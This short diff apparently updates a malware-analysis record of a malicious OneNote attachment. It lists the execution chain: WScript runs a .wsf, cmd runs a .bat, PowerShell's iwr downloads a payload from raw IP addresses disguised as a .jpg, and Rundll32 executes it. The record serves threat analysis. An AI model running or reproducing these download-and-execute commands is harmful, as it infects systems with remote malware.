@@ -12,13 +12,13 @@ Exec >
 
 ONENOTE.EXE C:\Users\Admin\AppData\Local\Temp\Contract_QE20(Feb22).one
 
-WScript.exe" "C:\Users\Admin\AppData\Local\Temp\1.wsf
+WScript.exe C:\Users\Admin\AppData\Local\Temp\OneNote\14.0\NT\0\O P E N.wsf
 
-cmd.exe /c ""C:\Users\Admin\AppData\Local\Temp\aNaUlv.bat" ndll"
+cmd /c ""C:\Users\Admin\AppData\Local\Temp\OneNote\14.0\NT\0\aNaUlv0y.bat" ndll"
 
-powershell iwr -uri http://77.83.199.12/282/535806.dat -o C:\programdata\aQjwnYcJ.jpg
+powershell  iwr -uri http://51.222.199.226/145/566647.dat -o C:\programdata\aiaV7JT69.jpg
 
-Rundll32 C:\programdata\aQjwnYcJ.jpg,N115
+Rundll32  C:\programdata\aiaV7JT69.jpg,N115
 
 *************************************************
 
